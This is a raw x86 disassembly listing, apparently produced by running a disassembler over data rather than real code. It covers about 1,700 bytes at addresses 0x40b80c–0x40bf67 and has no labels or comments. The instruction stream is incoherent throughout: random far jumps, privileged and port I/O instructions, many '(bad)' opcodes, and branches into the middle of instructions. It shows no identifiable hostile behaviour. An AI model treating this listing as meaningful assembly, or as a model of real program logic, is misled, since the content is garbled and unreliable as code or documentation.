  40b80c:	push   ebp
  40b80d:	jg     0x40b851
  40b80f:	cld    
  40b810:	ja     0x40b7dc
  40b812:	fimul  DWORD PTR [ecx-0x3d532ffb]
  40b818:	stos   BYTE PTR es:[edi],al
  40b819:	xor    al,0x75
  40b81b:	inc    edi
  40b81c:	pusha  
  40b81d:	push   ebp
  40b81e:	stc    
  40b81f:	fndisi(8087 only) 
  40b821:	in     eax,dx
  40b822:	sub    dh,BYTE PTR [eax+eiz*4]
  40b825:	inc    ebp
  40b826:	outs   dx,DWORD PTR ds:[esi]
  40b827:	test   al,0x65
  40b829:	mov    ecx,0xfd993bce
  40b82e:	loop   0x40b7cb
  40b830:	sbb    bl,BYTE PTR [esi-0x69c1c62a]
  40b836:	inc    esp
  40b837:	repz pop esi
  40b839:	sub    DWORD PTR [edi],esp
  40b83b:	daa    
  40b83c:	test   al,0x5d
  40b83e:	jnp    0x40b836
  40b840:	(bad)  
  40b841:	out    0x51,al
  40b843:	adc    al,0xb6
  40b845:	xchg   BYTE PTR [esi+0x41fc2a02],bh
  40b84b:	add    al,0xdc
  40b84d:	add    DWORD PTR [esi-0x39],esp
  40b850:	leave  
  40b851:	call   0xf30ebd80
  40b856:	fild   WORD PTR [ebx-0x14e41101]
  40b85c:	icebp  
  40b85d:	or     al,BYTE PTR [ecx]
  40b85f:	shl    BYTE PTR [edx],cl
  40b861:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b862:	jmp    0x40b891
  40b864:	inc    esi
  40b865:	retf   0xa9b2
  40b868:	xchg   ebp,eax
  40b869:	fisub  DWORD PTR [ebp+0x579870b9]
  40b86f:	stos   BYTE PTR es:[edi],al
  40b870:	mov    WORD PTR [ebx],ds
  40b872:	cmc    
  40b873:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b874:	mov    edi,0xa63258d5
  40b879:	add    al,BYTE PTR [ebp+eiz*2+0x25]
  40b87d:	sar    DWORD PTR [ebx],0x4d
  40b880:	push   edi
  40b881:	je     0x40b80e
  40b883:	(bad)  
  40b884:	gs pop ss
  40b886:	jg     0x40b822
  40b888:	lahf   
  40b889:	jmp    0x69fb:0xa48de96a
  40b890:	push   ss
  40b891:	cld    
  40b892:	std    
  40b893:	jmp    DWORD PTR [esi+0x41]
  40b896:	adc    BYTE PTR [edx],bl
  40b898:	ins    BYTE PTR es:[edi],dx
  40b899:	scas   eax,DWORD PTR es:[edi]
  40b89a:	es leave 
  40b89c:	iret   
  40b89d:	fcmovnbe st,st(0)
  40b89f:	stc    
  40b8a0:	jg     0x40b918
  40b8a2:	mov    DWORD PTR [edi+ebp*1],esp
  40b8a5:	and    DWORD PTR [edx+0x3c],0xffffff96
  40b8a9:	gs cwde 
  40b8ab:	push   esp
  40b8ac:	(bad)  
  40b8ad:	sbb    al,0xd4
  40b8af:	fstp   DWORD PTR [esi-0x4920e34]
  40b8b5:	mov    ebp,0x95e70648
  40b8ba:	outs   dx,BYTE PTR ds:[esi]
  40b8bb:	mov    eax,ds:0xe92342bf
  40b8c0:	add    DWORD PTR [ebp-0x5c],0xb873bd92
  40b8c7:	lods   eax,DWORD PTR ds:[esi]
  40b8c8:	jmp    0xfcaa9cc1
  40b8cd:	loope  0x40b8df
  40b8cf:	xchg   ebp,eax
  40b8d0:	pavgb  mm1,QWORD PTR [edi]
  40b8d3:	call   0x4bc9c5eb
  40b8d8:	push   eax
  40b8d9:	sbb    al,0xd4
  40b8db:	or     esi,edi
  40b8dd:	mov    cl,0x54
  40b8df:	lahf   
  40b8e0:	cli    
  40b8e1:	mov    eax,0x903065b3
  40b8e6:	iret   
  40b8e7:	ret    
  40b8e8:	dec    edx
  40b8e9:	pop    ecx
  40b8ea:	in     eax,0x46
  40b8ec:	imul   edi,eax,0xffffff83
  40b8ef:	ss inc esp
  40b8f1:	cli    
  40b8f2:	mov    ?,ecx
  40b8f4:	cld    
  40b8f5:	or     dh,cl
  40b8f7:	aas    
  40b8f8:	sub    DWORD PTR [esi+ebp*2+0x1f],0xffffffc9
  40b8fd:	fild   WORD PTR [ebx-0x7]
  40b900:	jb     0x40b97d
  40b902:	lea    eax,[ebx]
  40b904:	cmp    dl,BYTE PTR [ecx]
  40b906:	xor    BYTE PTR [ecx],cl
  40b908:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b909:	xor    dh,BYTE PTR [ebx]
  40b90b:	fwait
  40b90c:	mov    WORD PTR [edi-0x78a5699b],?
  40b912:	dec    esp
  40b913:	cmp    eax,0x15314f0a
  40b918:	mov    edi,0x42be98e
  40b91d:	pop    edx
  40b91e:	adc    BYTE PTR es:[eax],ch
  40b921:	xchg   ebp,eax
  40b922:	add    dl,BYTE PTR [eax+0x32]
  40b925:	aaa    
  40b926:	ret    0xc2a0
  40b929:	cmc    
  40b92a:	sub    ch,0x17
  40b92d:	data16 shl BYTE PTR [eax+0x59a00c9f],0xac
  40b935:	loop   0x40b969
  40b937:	(bad)  [edx]
  40b939:	sbb    DWORD PTR [edi+0x33],ebx
  40b93c:	fwait
  40b93d:	or     al,0x8e
  40b93f:	out    dx,eax
  40b940:	and    ebp,ebx
  40b942:	popa   
  40b943:	fwait
  40b944:	test   DWORD PTR [edi],ebx
  40b946:	jge    0x40b92e
  40b948:	lahf   
  40b949:	test   al,0xcc
  40b94b:	or     al,0xf5
  40b94d:	or     dh,BYTE PTR [ebx+0x58]
  40b950:	inc    ebx
  40b951:	enter  0xe911,0xec
  40b955:	int3   
  40b956:	xlat   BYTE PTR ds:[ebx]
  40b957:	xchg   BYTE PTR [esi-0x5c],ch
  40b95a:	mov    eax,ds:0xe553953
  40b95f:	and    ebp,edi
  40b961:	or     al,0x8e
  40b963:	cmp    eax,0x98b1450a
  40b968:	pop    edx
  40b969:	pop    ecx
  40b96a:	inc    edi
  40b96b:	mov    ah,BYTE PTR [edx+0x2d]
  40b96e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b96f:	sar    eax,cl
  40b971:	mov    esp,0xdb1d678a
  40b976:	dec    edx
  40b977:	jne    0x40b9af
  40b979:	(bad)  
  40b97a:	push   edi
  40b97b:	mov    edx,0x1af91e87
  40b980:	sahf   
  40b981:	push   ebx
  40b982:	cmp    BYTE PTR [ebx],bh
  40b984:	cmp    BYTE PTR [edi],dl
  40b986:	pop    ebx
  40b987:	lds    ecx,FWORD PTR [edi+0x718c2e35]
  40b98d:	sbb    al,0x10
  40b98f:	shr    DWORD PTR [edi+0x4c00e81e],1
  40b995:	(bad)  
  40b996:	scas   al,BYTE PTR es:[edi]
  40b997:	dec    ebx
  40b998:	pop    esi
  40b999:	push   ebx
  40b99a:	xchg   BYTE PTR [esi+0x1e],ah
  40b99d:	inc    edi
  40b99e:	jge    0x40b994
  40b9a0:	repz in al,dx
  40b9a2:	jg     0x40b9ba
  40b9a4:	mov    ds:0xe01ffa77,al
  40b9a9:	fadd   DWORD PTR [edx+0x45]
  40b9ac:	outs   dx,BYTE PTR ds:[esi]
  40b9ad:	fwait
  40b9ae:	nop
  40b9af:	aaa    
  40b9b0:	jl     0x40b98f
  40b9b2:	and    ecx,DWORD PTR [esi+0x592fcfe9]
  40b9b8:	iret   
  40b9b9:	retf   
  40b9ba:	xchg   ebx,eax
  40b9bc:	cli    
  40b9bd:	fldpi  
  40b9bf:	cmp    BYTE PTR [eax+0x4bb4bcd7],ch
  40b9c5:	(bad)  
  40b9c6:	shl    DWORD PTR ds:0x6cff4126,cl
  40b9cc:	ror    BYTE PTR [edx+0x4d72f40e],0x12
  40b9d3:	aaa    
  40b9d4:	inc    esp
  40b9d5:	xchg   esp,eax
  40b9d6:	out    0x1b,eax
  40b9d8:	stos   BYTE PTR es:[edi],al
  40b9d9:	gs mov cx,0x3060
  40b9de:	push   ecx
  40b9df:	add    DWORD PTR [esp+ecx*2-0x734c6493],0xe38483
  40b9ea:	gs mov edi,0x4a0f9d23
  40b9f0:	mov    ecx,0x5f860243
  40b9f5:	jp     0x40ba4d
  40b9f7:	mov    dl,0xf9
  40b9f9:	nop
  40b9fa:	cwde   
  40b9fb:	mov    esp,0x2db3512a
  40ba00:	sbb    DWORD PTR [esi+0x7e86397e],edx
  40ba06:	push   edi
  40ba07:	(bad)  
  40ba08:	push   0xaf1cf503
  40ba0d:	cwde   
  40ba0e:	pop    es
  40ba0f:	les    ebx,FWORD PTR [ecx]
  40ba11:	bound  eax,QWORD PTR [ecx-0x76]
  40ba14:	xchg   BYTE PTR [esi+0x8811775],ah
  40ba1a:	push   ebp
  40ba1b:	div    BYTE PTR [esi+0x59]
  40ba1e:	aad    0x68
  40ba20:	jae    0x40b9b3
  40ba22:	ret    0xba14
  40ba25:	pop    edi
  40ba26:	dec    eax
  40ba27:	test   al,0x3d
  40ba29:	jno    0x40ba53
  40ba2b:	adc    BYTE PTR [edx],ch
  40ba2d:	push   0xffffffa3
  40ba2f:	rol    DWORD PTR [esi+0x5e2ca9aa],cl
  40ba35:	pop    es
  40ba36:	fnsave ds:0xaf205027
  40ba3c:	xor    al,BYTE PTR [eax+0x2b0a9d0a]
  40ba42:	xor    esi,DWORD PTR [ecx]
  40ba44:	daa    
  40ba45:	scas   al,BYTE PTR es:[edi]
  40ba46:	fiadd  DWORD PTR [edi]
  40ba48:	mov    esp,0xe6789f6
  40ba4d:	fwait
  40ba4e:	es into 
  40ba50:	je     0x40ba03
  40ba52:	mov    cs,WORD PTR [eax]
  40ba54:	js     0x40ba63
  40ba56:	ds je  0x40ba0b
  40ba59:	xchg   esp,eax
  40ba5a:	jne    0x40ba84
  40ba5c:	mov    ah,0x99
  40ba5e:	(bad)  
  40ba5f:	dec    ebx
  40ba60:	xchg   edx,eax
  40ba61:	ins    BYTE PTR es:[edi],dx
  40ba62:	xchg   edx,eax
  40ba63:	cmp    al,0x7b
  40ba65:	sbb    BYTE PTR [edi+ebp*1-0x5c1711a0],bh
  40ba6c:	dec    ebx
  40ba6d:	adc    esi,DWORD PTR [ecx+esi*8-0x26b5ebfd]
  40ba74:	shl    BYTE PTR [esi+eiz*2+0x7bcadfc4],1
  40ba7b:	js     0x40ba9a
  40ba7d:	ficomp DWORD PTR [ecx]
  40ba7f:	xchg   edi,eax
  40ba80:	inc    esi
  40ba81:	xor    bl,bl
  40ba83:	mov    bl,cl
  40ba85:	call   0x97f3:0x4f44fb16
  40ba8c:	enter  0xeb3b,0xd6
  40ba90:	mov    BYTE PTR [ebx+0x23],dl
  40ba93:	lock test al,0xb5
  40ba96:	xchg   BYTE PTR [edx-0x69],cl
  40ba99:	push   ebx
  40ba9a:	cs repnz dec ebx
  40ba9d:	aam    0x22
  40ba9f:	ret    
  40baa0:	pushf  
  40baa1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40baa2:	jmp    0x40baa6
  40baa4:	sub    dh,BYTE PTR [edi+0x3f09cf98]
  40baaa:	push   0xaa38f149
  40baaf:	loope  0x40ba8e
  40bab1:	ins    BYTE PTR es:[edi],dx
  40bab2:	das    
  40bab3:	or     eax,0x92f452bf
  40bab8:	into   
  40bab9:	pusha  
  40baba:	push   eax
  40babb:	pop    ds
  40babc:	pop    edx
  40babd:	pop    ecx
  40babe:	jmp    0x3e554a9b
  40bac3:	stos   DWORD PTR es:[edi],eax
  40bac4:	push   di
  40bac6:	push   ds
  40bac7:	pop    ecx
  40bac8:	xor    ch,bh
  40baca:	jmp    0x40ba4e
  40bacc:	pop    ds
  40bacd:	repnz out dx,eax
  40bacf:	sbb    ebx,DWORD PTR [ebp+0x2d2822f7]
  40bad5:	fdivr  DWORD PTR [eax+0x77]
  40bad8:	lea    edi,[eax-0x402d104e]
  40bade:	inc    eax
  40badf:	(bad)  
  40bae0:	fsin   
  40bae2:	add    DWORD PTR [edi-0x78d42875],esi
  40bae8:	dec    edi
  40bae9:	cli    
  40baea:	pop    ebx
  40baeb:	ret    
  40baec:	xor    DWORD PTR [esi],esp
  40baee:	xor    BYTE PTR [esi],bh
  40baf0:	test   al,0xaf
  40baf2:	inc    eax
  40baf3:	sub    al,0x45
  40baf5:	jno    0x40bae3
  40baf7:	test   al,0x30
  40baf9:	loope  0x40ba97
  40bafb:	mov    DWORD PTR [eax+0x1e],edi
  40bafe:	lods   eax,DWORD PTR ds:[esi]
  40baff:	mov    eax,0x9834dccf
  40bb04:	pop    ebx
  40bb05:	int    0x6e
  40bb07:	cmp    BYTE PTR [ebx+0x68],bl
  40bb0a:	jp     0x40bb18
  40bb0c:	ja     0x40bb2c
  40bb0e:	into   
  40bb0f:	dec    esi
  40bb10:	push   0x21e4cb61
  40bb15:	pop    ecx
  40bb16:	pop    ds
  40bb17:	popf   
  40bb18:	inc    ecx
  40bb19:	mov    eax,DWORD PTR [ecx]
  40bb1b:	test   eax,0xf9ea5bce
  40bb20:	int    0x26
  40bb22:	js     0x40bb02
  40bb24:	jbe    0x40baa8
  40bb26:	loopne 0x40bb0b
  40bb28:	xor    al,BYTE PTR fs:[edi+0x71]
  40bb2c:	ficom  DWORD PTR [ebp-0x4fbb888c]
  40bb32:	iret   
  40bb33:	add    BYTE PTR [ebx+eax*8+0x8],ah
  40bb37:	xchg   cl,cl
  40bb39:	or     al,al
  40bb3b:	cmp    eax,0xe9f4ac8f
  40bb40:	loop   0x40bb9f
  40bb42:	jb     0x40badb
  40bb44:	(bad)  
  40bb45:	dec    esp
  40bb46:	mov    ecx,0xe52bb304
  40bb4b:	adc    eax,DWORD PTR ds:[ecx+0x55f60baf]
  40bb52:	ror    ecx,1
  40bb54:	sub    BYTE PTR [esi+0x45839901],dl
  40bb5a:	cmp    al,0xc5
  40bb5c:	fwait
  40bb5d:	cmp    BYTE PTR [ecx+0x9],cl
  40bb60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb61:	mov    ds,WORD PTR [ecx]
  40bb63:	mov    WORD PTR [ebx-0x3c22e659],ds
  40bb69:	sub    dl,BYTE PTR [esp+edx*4]
  40bb6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb6d:	and    eax,0x1244d026
  40bb72:	ret    0x9da3
  40bb75:	fsub   QWORD PTR [edi]
  40bb77:	adc    al,0x4c
  40bb79:	add    al,0x59
  40bb7b:	lahf   
  40bb7c:	or     esi,esp
  40bb7e:	push   ebx
  40bb7f:	sbb    bh,ch
  40bb81:	fwait
  40bb82:	sbb    eax,0xefdec25a
  40bb87:	or     eax,0xdcdbb627
  40bb8c:	xor    BYTE PTR [ebp+0x29],al
  40bb8f:	inc    ebx
  40bb90:	adc    DWORD PTR [esi+0x2bfdbbf3],ebp
  40bb96:	cmp    BYTE PTR [esp+edx*2+0x9a963f9],cl
  40bb9d:	jmp    0x40bb7a
  40bb9f:	sbb    bh,BYTE PTR [ecx-0x4e74daf6]
  40bba5:	xchg   BYTE PTR [ecx],ah
  40bba7:	outs   dx,DWORD PTR ds:[esi]
  40bba8:	inc    eax
  40bba9:	cs push 0xffffffff
  40bbac:	push   edi
  40bbad:	jmp    0x36c6:0xf0e5adf1
  40bbb4:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40bbb6:	xchg   edi,eax
  40bbb7:	in     al,0x67
  40bbb9:	dec    edi
  40bbba:	lds    eax,FWORD PTR [ebx]
  40bbbc:	cmp    dh,BYTE PTR [edi]
  40bbbe:	leave  
  40bbbf:	push   0x629e8348
  40bbc4:	lea    esp,[eax-0x5be95230]
  40bbca:	neg    dl
  40bbcc:	cdq    
  40bbcd:	jmp    0xc5b140d
  40bbd2:	outs   dx,DWORD PTR ds:[esi]
  40bbd3:	pop    esp
  40bbd4:	mov    eax,0x6195fcb
  40bbd9:	cld    
  40bbda:	mov    al,ds:0x50e87aeb
  40bbdf:	sub    DWORD PTR [esi],ecx
  40bbe1:	leave  
  40bbe2:	lea    edi,ds:0x77a08c36
  40bbe8:	xor    DWORD PTR [esp+eax*2-0x62],eax
  40bbec:	int3   
  40bbed:	cld    
  40bbee:	lea    esi,[ecx]
  40bbf0:	dec    ecx
  40bbf1:	xchg   ebp,eax
  40bbf2:	fidivr WORD PTR [edi+0x673dd3c5]
  40bbf8:	cdq    
  40bbf9:	test   dh,0xf0
  40bbfc:	jmp    0xc7fd:0x94cfa445
  40bc03:	push   edi
  40bc04:	lock jl 0x40bc73
  40bc07:	sbb    bl,BYTE PTR [ebx+eiz*8-0x5b]
  40bc0b:	je     0x40bbbf
  40bc0d:	dec    edx
  40bc0e:	aaa    
  40bc0f:	mov    ds:0x8d3c82ca,eax
  40bc14:	push   edx
  40bc15:	or     BYTE PTR [ebp+eax*4-0x6f],ah
  40bc19:	sar    DWORD PTR [esi+0x5e39d14a],cl
  40bc1f:	mov    cl,0x1b
  40bc21:	mov    ah,BYTE PTR [esi-0x60bb1a96]
  40bc27:	sbb    DWORD PTR [esi-0xa],0x7e
  40bc2b:	call   0xb775:0xc2b9fae3
  40bc32:	clc    
  40bc33:	jb     0x40bbfc
  40bc35:	or     eax,0x45ccb469
  40bc3a:	sub    eax,0x38106f59
  40bc3f:	xchg   ebp,eax
  40bc40:	push   ebx
  40bc41:	repnz in al,dx
  40bc43:	(bad)  
  40bc44:	cmp    eax,0x9486c641
  40bc49:	sub    al,0x31
  40bc4b:	test   DWORD PTR [eax+0x1e],ebx
  40bc4e:	add    al,0x6a
  40bc50:	mov    eax,DWORD PTR [edx-0x45]
  40bc53:	sbb    DWORD PTR [edi+ebx*4],eax
  40bc56:	sub    esi,DWORD PTR [ecx]
  40bc58:	pop    ecx
  40bc59:	test   BYTE PTR [eax+0x5e],bl
  40bc5c:	cmp    ecx,DWORD PTR [edi-0x52]
  40bc5f:	mov    ds:0xe10f27b8,eax
  40bc64:	push   ds
  40bc65:	mov    bl,0xff
  40bc67:	and    bh,ah
  40bc69:	mov    ds:0x2eb96229,eax
  40bc6e:	and    ecx,ebx
  40bc70:	xor    DWORD PTR ds:0x2d41efa6,edx
  40bc76:	iret   
  40bc77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc78:	adc    edx,DWORD PTR [ebx+0x78]
  40bc7b:	inc    edi
  40bc7c:	loop   0x40bcb2
  40bc7e:	pop    edi
  40bc7f:	xor    DWORD PTR [edx],ebx
  40bc81:	dec    esi
  40bc82:	les    eax,FWORD PTR [edx-0x1e]
  40bc85:	pusha  
  40bc86:	popf   
  40bc87:	push   edi
  40bc88:	out    dx,al
  40bc89:	in     al,0x9c
  40bc8b:	pop    esi
  40bc8c:	jecxz  0x40bce8
  40bc8e:	mov    ebx,0x22f171b1
  40bc93:	mov    esp,0xe9b47c4e
  40bc98:	add    DWORD PTR [esp+eax*1-0x1cac04fa],esp
  40bc9f:	mov    edx,0xcc4aff4b
  40bca4:	add    edi,ebp
  40bca6:	hlt    
  40bca7:	(bad)  
  40bca8:	aad    0x60
  40bcaa:	add    dl,BYTE PTR [ebx+eiz*4]
  40bcad:	in     eax,dx
  40bcae:	aad    0x7d
  40bcb0:	xchg   ebp,eax
  40bcb1:	mov    bh,0x3
  40bcb3:	mov    ah,0xc5
  40bcb5:	jge    0x40bcc2
  40bcb7:	mov    esi,DWORD PTR [ebp-0x2f]
  40bcba:	lea    esi,[ebx]
  40bcbc:	fnstenv [ebp+eiz*1+0x7340b5d9]
  40bcc3:	gs xchg esi,eax
  40bcc5:	stos   WORD PTR es:[edi],ax
  40bcc7:	fsubr  st,st(2)
  40bcc9:	ret    0x4256
  40bccc:	scas   eax,DWORD PTR es:[edi]
  40bccd:	pop    ss
  40bcce:	add    bl,dh
  40bcd0:	xchg   ecx,eax
  40bcd1:	mov    ebp,0x66083fc0
  40bcd6:	and    DWORD PTR ds:0x15378cf0,edx
  40bcdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bcdd:	mov    ecx,0x5823e5fc
  40bce2:	pusha  
  40bce3:	or     eax,0x8c1c929a
  40bce8:	adc    esi,ebp
  40bcea:	(bad)  
  40bceb:	fmul   QWORD PTR [eax-0x4b]
  40bcee:	xchg   edx,eax
  40bcef:	add    eax,esp
  40bcf1:	mov    bh,0xd4
  40bcf3:	ins    BYTE PTR es:[edi],dx
  40bcf4:	mov    al,0x2c
  40bcf6:	sbb    DWORD PTR [ecx-0x1b],ecx
  40bcf9:	sbb    cl,BYTE PTR [esp+0x7d]
  40bcfd:	and    edx,DWORD PTR [edi]
  40bcff:	arpl   WORD PTR [ebp+eax*1+0x62dd9f3b],bx
  40bd06:	int    0x60
  40bd08:	dec    ecx
  40bd09:	bound  esp,QWORD PTR [ebp+0x5a1bf886]
  40bd0f:	and    al,0xbd
  40bd11:	mov    ebp,0x59bd58c2
  40bd16:	push   esi
  40bd17:	jg     0x40bcc0
  40bd19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd1a:	xchg   esp,eax
  40bd1b:	arpl   bx,bp
  40bd1d:	push   ebx
  40bd1e:	pushf  
  40bd1f:	leave  
  40bd20:	dec    edi
  40bd21:	add    dh,BYTE PTR [ebp+0x62]
  40bd24:	mov    ebp,0x824cd3dc
  40bd29:	jns    0x40bcb7
  40bd2b:	fistp  WORD PTR [ebp+0x1770aaea]
  40bd31:	scas   eax,DWORD PTR es:[edi]
  40bd32:	xor    BYTE PTR [edi+0x27],dh
  40bd35:	das    
  40bd36:	pop    ebp
  40bd37:	sbb    DWORD PTR [edi],ebx
  40bd39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd3a:	sbb    dh,BYTE PTR [edi+edx*8+0x38ed6279]
  40bd41:	sbb    DWORD PTR [edx+0x6e],esi
  40bd44:	pop    ds
  40bd45:	push   ax
  40bd47:	add    dh,ah
  40bd49:	push   esi
  40bd4a:	int3   
  40bd4b:	rcr    BYTE PTR [bp+si-0x18],1
  40bd4f:	mov    ebp,0x7f050a59
  40bd54:	ret    0x3b4e
  40bd57:	call   0x379c4766
  40bd5c:	shr    dl,cl
  40bd5e:	pop    esi
  40bd5f:	imul   BYTE PTR [eax-0x7efc440f]
  40bd65:	ins    BYTE PTR es:[edi],dx
  40bd66:	sub    BYTE PTR [ecx+ebp*2-0x39d723ff],bl
  40bd6d:	adc    dh,BYTE PTR [edi-0x7ea73d87]
  40bd73:	inc    ebp
  40bd74:	cdq    
  40bd75:	call   0xb5de:0x2e7efe4f
  40bd7c:	scas   eax,DWORD PTR es:[edi]
  40bd7d:	loope  0x40bdb0
  40bd7f:	mov    dl,0x93
  40bd81:	xor    BYTE PTR [edx+0x66],ah
  40bd84:	push   esi
  40bd85:	sti    
  40bd86:	xor    BYTE PTR [ebp+0x24],0xbc
  40bd8a:	xchg   ebp,eax
  40bd8b:	pop    edi
  40bd8c:	rcr    cl,0x4
  40bd8f:	cmp    ecx,0x868740e8
  40bd95:	mov    edx,fs
  40bd97:	retf   
  40bd98:	push   ds
  40bd99:	push   esp
  40bd9a:	lock lds edx,FWORD PTR [ecx-0x2d2f0119]
  40bda1:	cli    
  40bda2:	add    al,BYTE PTR [ebx]
  40bda4:	and    al,0x2f
  40bda6:	or     esi,DWORD PTR [ecx]
  40bda8:	rcl    DWORD PTR [esi],cl
  40bdaa:	outs   dx,DWORD PTR ds:[esi]
  40bdab:	leave  
  40bdac:	xor    BYTE PTR [ebx+0x288c8788],bl
  40bdb2:	call   0x44504811
  40bdb7:	push   esp
  40bdb8:	lahf   
  40bdb9:	xor    al,0xa5
  40bdbb:	and    DWORD PTR [ecx-0x42],ebx
  40bdbe:	or     BYTE PTR [esi+edi*1+0xd],cl
  40bdc2:	xchg   ebp,eax
  40bdc3:	dec    edx
  40bdc4:	adc    eax,0xa2d1a92f
  40bdc9:	fnstcw WORD PTR [esi]
  40bdcb:	clc    
  40bdcc:	int    0xb4
  40bdce:	fwait
  40bdcf:	in     al,dx
  40bdd0:	out    dx,al
  40bdd1:	mov    ebp,DWORD PTR [ecx]
  40bdd3:	rcl    BYTE PTR ds:[ebp+0x47a0baa5],cl
  40bdda:	scas   al,BYTE PTR es:[edi]
  40bddb:	xchg   edx,eax
  40bddc:	int3   
  40bddd:	pop    eax
  40bdde:	xchg   ecx,esp
  40bde0:	inc    eax
  40bde1:	aaa    
  40bde2:	sti    
  40bde3:	lods   eax,DWORD PTR ds:[esi]
  40bde4:	mov    bh,0x6
  40bde6:	ins    BYTE PTR es:[edi],dx
  40bde7:	mov    WORD PTR [esi],?
  40bde9:	xor    DWORD PTR [eax],esi
  40bdeb:	out    0xd5,al
  40bded:	push   esi
  40bdee:	in     eax,dx
  40bdef:	popa   
  40bdf0:	add    eax,0xe4306339
  40bdf5:	dec    esp
  40bdf6:	(bad)
  40bdf9:	loope  0x40be45
  40bdfb:	mov    ebx,0x6296e258
  40be00:	and    al,0x5e
  40be02:	fcom   QWORD PTR [ecx+0x6559e9c5]
  40be08:	dec    esp
  40be09:	ins    BYTE PTR es:[edi],dx
  40be0a:	ret    
  40be0b:	cmc    
  40be0c:	xor    cl,BYTE PTR [eax]
  40be0e:	dec    ebp
  40be0f:	jle    0x40be1e
  40be11:	test   BYTE PTR [edx-0x32],bh
  40be14:	cmp    ebx,DWORD PTR ds:0x81af6702
  40be1a:	and    al,0x14
  40be1c:	test   eax,0x3856bea7
  40be21:	cli    
  40be22:	fs push es
  40be24:	(bad)  
  40be25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be26:	dec    ecx
  40be27:	mov    esi,0xef1038e6
  40be2c:	fdivp  st(7),st
  40be2e:	xchg   BYTE PTR [ebp-0x6afa943],al
  40be34:	sub    al,ah
  40be36:	les    esi,FWORD PTR [ecx+0x6f]
  40be39:	sub    al,BYTE PTR [eax-0x2ed94810]
  40be3f:	inc    ebx
  40be40:	pop    edi
  40be41:	inc    ecx
  40be42:	jmp    0x9c10:0xe218705c
  40be49:	sbb    DWORD PTR [ebx+eiz*4],eax
  40be4c:	fcomp  DWORD PTR [edx+0x6bb88384]
  40be52:	scas   eax,DWORD PTR es:[edi]
  40be53:	(bad)
  40be57:	mov    dl,cl
  40be59:	addr16 push cs
  40be5b:	out    0x6c,al
  40be5d:	inc    edx
  40be5e:	mov    ss,WORD PTR [esi-0x7503646d]
  40be64:	mov    BYTE PTR [ebp-0x74],ah
  40be67:	xor    bl,BYTE PTR [edx+0x4bd3f873]
  40be6d:	and    ecx,DWORD PTR [edx]
  40be6f:	pop    esi
  40be70:	shl    BYTE PTR [esi+esi*8-0x49],1
  40be74:	sbb    eax,0xa816c7ca
  40be79:	(bad)  
  40be7a:	jb     0x40be73
  40be7c:	popf   
  40be7d:	inc    ebx
  40be7e:	inc    ebp
  40be7f:	shl    BYTE PTR [eax+edx*8-0x729b9c24],0x7d
  40be87:	imul   esp,DWORD PTR [ebp+0x4e],0x810037e6
  40be8e:	cmc    
  40be8f:	(bad)  
  40be90:	xor    eax,0x3c027d94
  40be95:	mov    dl,0x7e
  40be97:	or     edx,DWORD PTR [edi]
  40be99:	jne    0x40bebe
  40be9b:	ficomp WORD PTR [esi+0x7c28b5d5]
  40bea1:	mov    esi,esi
  40bea3:	int    0x17
  40bea5:	jb     0x40beeb
  40bea7:	inc    esi
  40bea8:	add    ebx,esi
  40beaa:	jmp    0xae65:0xbd0b10a8
  40beb1:	js     0x40bee8
  40beb3:	mov    bl,0xba
  40beb5:	dec    esp
  40beb6:	mov    ch,0x7a
  40beb8:	int3   
  40beb9:	out    dx,eax
  40beba:	test   al,0xe3
  40bebc:	or     DWORD PTR [esi+0x3808e407],eax
  40bec2:	ror    BYTE PTR [ecx],1
  40bec4:	sbb    dl,BYTE PTR [esp+edi*4]
  40bec7:	call   0x3833:0x30c6138c
  40bece:	mov    eax,0xc0c09217
  40bed3:	inc    ecx
  40bed4:	add    ecx,DWORD PTR [eax+edi*4-0x257db688]
  40bedb:	push   esp
  40bedc:	mov    esp,0x75b471b2
  40bee1:	cmp    edi,DWORD PTR [eax-0x94d3829]
  40bee7:	push   0x1f2990af
  40beec:	sbb    ah,BYTE PTR [edx+0x79]
  40beef:	or     eax,0x35b2aa00
  40bef4:	adc    al,0xfe
  40bef6:	push   ecx
  40bef7:	mov    ds:0xa96bc9a7,eax
  40befc:	sub    dh,BYTE PTR [esi]
  40befe:	jns    0x40bee3
  40bf00:	sysret 
  40bf02:	sbb    BYTE PTR [edx+ebx*1],dh
  40bf05:	push   ss
  40bf06:	mov    cl,0xcf
  40bf08:	aaa    
  40bf09:	or     BYTE PTR [ebp+0x2db3eba0],dh
  40bf0f:	cmp    al,0x4
  40bf11:	sub    al,0xe
  40bf13:	and    al,0x46
  40bf15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf16:	pop    esi
  40bf17:	pop    ebp
  40bf18:	sti    
  40bf19:	jmp    0x6a42:0xf638c250
  40bf20:	dec    ecx
  40bf21:	xor    BYTE PTR [ecx+0x55c9c6],dh
  40bf27:	fincstp 
  40bf29:	xor    BYTE PTR [ebx+0xaab1faf],bh
  40bf2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf30:	or     al,bl
  40bf32:	xor    edx,DWORD PTR [ecx+0xc]
  40bf35:	fadd   QWORD PTR [ebp+0x4fac52d4]
  40bf3b:	sti    
  40bf3c:	pop    ds
  40bf3d:	fmul   QWORD PTR [esi+0x6121e51a]
  40bf43:	add    eax,0x36b2d410
  40bf48:	and    eax,0xcc0a3aff
  40bf4d:	cmp    bl,BYTE PTR [esi-0x3037c3f]
  40bf53:	dec    ebx
  40bf54:	in     eax,dx
  40bf55:	popf   
  40bf56:	test   DWORD PTR [ebx],esi
  40bf58:	arpl   WORD PTR fs:[ebp+edx*8+0x54],si
  40bf5d:	mov    cs,WORD PTR [ecx+edx*2+0xc]
  40bf61:	fiadd  WORD PTR [eax+0xefd5dfc]
  40bf67:	loope  0x40bfbc
